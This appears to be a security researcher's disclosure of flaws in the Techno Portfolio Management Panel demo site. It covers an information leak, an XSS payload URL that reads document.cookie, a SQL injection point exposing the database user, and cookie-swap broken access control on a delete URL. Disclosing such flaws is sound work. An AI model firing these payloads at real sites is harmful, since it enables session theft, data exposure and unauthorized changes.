###Techno Portfolio Management Panel - SQL Injection/XSS/Information leak/Broken Access Control

Well,  when I pentest the official demo site of Techno Portfolio Management Panel.

I found when I login into the backend,  it left some vulnerabilities here.

##### Information leak:

URL: http://dacy.esy.es/eng/panel/search.php?s=1'

For example, we can get some sensitive data here like the absolute path:

/home/u633631124/public_html/eng/panel/search.php

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Techno-Portfolio-Management-Panel/info_leak.png)


##### xss:

URL: http://dacy.esy.es/eng/panel/search.php?s=123%27%22%3E%3Csvg/onload=alert(document.cookie)%3E%3C%27%22

For example, We can get the site cookie here or do something more evilly. 

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Techno-Portfolio-Management-Panel/xss.png)


##### SQL Injection:


![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Techno-Portfolio-Management-Panel/sqli.png)

URL: http://dacy.esy.es/eng/panel/search.php?s=1

For example, We can get database user or other info here , using some tools or just by hand:

current user:    'u633631124_dacy@10.2.1.20'

##### Broken Access Control

While the feedback option should only be viewed or operated only by the admin user itself , I used the cookie of the demo normal user to replace the cookie of admin, and I removed a feedback successfully by the authority of normal user at last .

Feedback Remove URL:
http://dacy.esy.es/eng/panel/portfolio.php?action=delete&id=x

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Techno-Portfolio-Management-Panel/access1.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Techno-Portfolio-Management-Panel/access2.png)

At a word, it's a vulnerability of broken access control.
